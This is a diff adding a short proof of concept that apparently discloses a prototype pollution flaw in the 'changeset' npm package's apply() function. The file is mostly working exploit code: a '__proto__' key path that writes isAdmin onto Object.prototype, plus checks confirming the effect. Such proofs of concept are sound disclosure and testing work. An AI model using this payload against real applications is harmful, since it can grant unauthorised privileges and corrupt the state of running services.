@@ -1,0 +1,27 @@
+Confirmed prototype pollution in `changeset.apply()`.
+
+```javascript
+// Prototype Pollution in `changeset` (v0.1.0) via apply()
+// The key-path walker in apply() does not block "__proto__" segments,
+// so a crafted change-set entry lets an attacker write directly onto
+// Object.prototype, polluting every object in the process.
+
+const changeset = require("./node_modules/changeset");
+
+const target = {}; // e.g. an object being restored from a diff/changeset
+const maliciousChanges = [
+  { type: "put", key: ["__proto__", "isAdmin"], value: true }
+];
+
+// third arg (isDiff=true) tells apply() to mutate `target` directly (no udc clone)
+changeset.apply(maliciousChanges, target, true);
+
+// The pollution leaks into every plain object in the process:
+const victim = {};
+console.log("victim.isAdmin:", victim.isAdmin); // => true
+console.log("({}).isAdmin:", ({}).isAdmin);       // => true
+
+if (({}).isAdmin === true) {
+  console.log("Prototype pollution CONFIRMED: Object.prototype.isAdmin was set");
+}
+```
